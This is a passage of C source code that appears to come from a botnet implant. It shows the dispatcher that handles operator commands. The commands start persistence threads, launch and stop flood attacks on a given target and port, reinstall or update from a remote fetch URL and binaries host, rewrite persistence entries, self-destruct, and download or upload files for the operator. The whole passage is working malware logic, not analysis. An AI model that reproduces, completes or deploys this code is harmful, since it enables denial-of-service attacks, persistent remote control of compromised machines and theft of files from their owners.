#endif /* NO_SELFREP */

    case CMD_PERSIST:
    {
        pthread_t tid;
        pthread_create(&tid, NULL, dragonfly_thread, NULL);
        pthread_detach(tid);
        vpn_writes(c, ds_cstr(&g_msg_persist_start));
        return 0;
    }

#ifndef NO_ATTACK
    case CMD_ATTACK: /* args = "method target port duration [key=val ...]" */
    {
        /* Reuse black_energy's attack parsing by reconstructing the text command */
        char cmd[4200];
        snprintf(cmd, sizeof(cmd), "!attack %s", args);
        return black_energy(c, cmd);
    }

    case CMD_STOPATTACK:
        attack_kill_all();
        vpn_writes(c, "[attack] all floods stopped\n");
        return 0;
#endif

    case CMD_REINSTALL: /* args = "url" */
    {
        char cmd[4200];
        if (!args || !args[0]) {
            vpn_writes(c, "[reinstall] missing URL\n");
            return -1;
        }
        snprintf(cmd, sizeof(cmd), "!reinstall %s", args);
        return black_energy(c, cmd);
    }

    case CMD_UPDATEFETCH: /* args = "<fetch_url> [bins_host]" */
    {
        char url_buf[1024], host_buf[512];
        const char *p;
        int i;

        if (!args || !args[0]) {
            vpn_writes(c, "[updatefetch] missing URL\n");
            return -1;
        }

        /* Parse first token: fetch_url */
        p = args;
        for (i = 0; *p && *p != ' ' && i < (int)sizeof(url_buf) - 1; p++, i++)
            url_buf[i] = *p;
        url_buf[i] = '\0';

        /* Update g_fetch_url in memory */
        ensure_boot();
        ds_set(&g_fetch_url, url_buf);

        /* Parse optional second token: bins_host */
        if (*p == ' ') {
            p++;
            for (i = 0; *p && *p != ' ' && i < (int)sizeof(host_buf) - 1; p++, i++)
                host_buf[i] = *p;
            host_buf[i] = '\0';
            if (host_buf[0]) {
                ds_set(&g_bins_host_str, host_buf);
                g_bins_host_ptr = ds_cstr(&g_bins_host_str);
            }
        }

        /* Rewrite all persistence entries with new URL */
        persist_refresh();

        vpn_writes(c, "[updatefetch] updated + persistence refreshed\n");
        return 0;
    }

    case CMD_KILL:
        vpn_writes(c, ds_cstr(&g_msg_kill_ack));
        nuke_and_exit();
        return 0;

    case CMD_EXIT:
        _exit(0);
        return 0;

    case CMD_DOWNLOAD: /* args = "filepath" */
    {
        char cmd[4200];
        if (!args || !args[0]) {
            vpn_writes(c, "[download] missing path\n");
            return -1;
        }
        snprintf(cmd, sizeof(cmd), "!download %s", args);
        return black_energy(c, cmd);
    }

    case CMD_UPLOAD: /* args = "filepath base64data" */
    {
        char cmd[65536];
        if (!args || !args[0]) {
            vpn_writes(c, "[upload] missing args\n");
            return -1;
        }
        snprintf(cmd, sizeof(cmd), "!upload %s", args);
        return black_energy(c, cmd);
    }

    default:
        debug_log("dispatch_cmd: unknown cmd_id 0x%02X", cmd_id);
        return -1;
    }
}
